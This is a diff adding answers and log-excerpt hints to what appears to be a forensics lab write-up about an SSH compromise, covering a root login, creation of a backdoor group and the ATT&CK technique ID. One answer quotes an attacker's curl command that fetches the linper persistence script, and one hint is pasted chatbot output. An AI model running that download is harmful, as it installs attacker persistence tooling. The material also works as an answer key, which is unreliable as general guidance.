@@ -82,19 +82,56 @@ btmp records only failed login attempts.
 answer:37
 
 HINT:
-Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2                                                                                                                                       
-Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)                                                                                                                            
+Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
+Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
 Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root. 
 ```
 
 
+## qn5
+```
+answer:cyberjunkie
+
+HINT:
+Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
+Mar  6 06:33:01 ip-172-31-35-28 CRON[2561]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:33:01 ip-172-31-35-28 CRON[2562]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:33:01 ip-172-31-35-28 CRON[2561]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:33:01 ip-172-31-35-28 CRON[2562]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:34:01 ip-172-31-35-28 CRON[2574]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:34:01 ip-172-31-35-28 CRON[2575]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:34:01 ip-172-31-35-28 CRON[2575]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:34:01 ip-172-31-35-28 CRON[2574]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002
+Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie   
+```
+
+## qn 6
+```
+
+answer:T1136.001
+
+HINT:(gemini)
+This sub-technique describes attackers creating a new local account on the compromised server itself and potentially granting it high privileges for persistence.
+
+Here's the reasoning:
+
+    New User: The scenario mentions adding a new user, aligning with account creation.
+    High Privileges: Granting the new user high privileges strengthens the attacker's persistence.
+    Local Account: While the scenario doesn't explicitly state local vs domain account, focusing on persistence on the server suggests a local account creation.
+
+While it's possible the attacker might use a domain account for persistence (T1136.002), the emphasis on the server itself points towards a local account being more likely.
+
+Understanding the context and the specific details of the attack is crucial for accurate MITRE ATT&CK identification. Thank you for your patience and for helping me learn from my mistakes.
+```
 
 
 
+## qn 8
+```
+answer: /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
 
-
-
-
+```
 
 
 
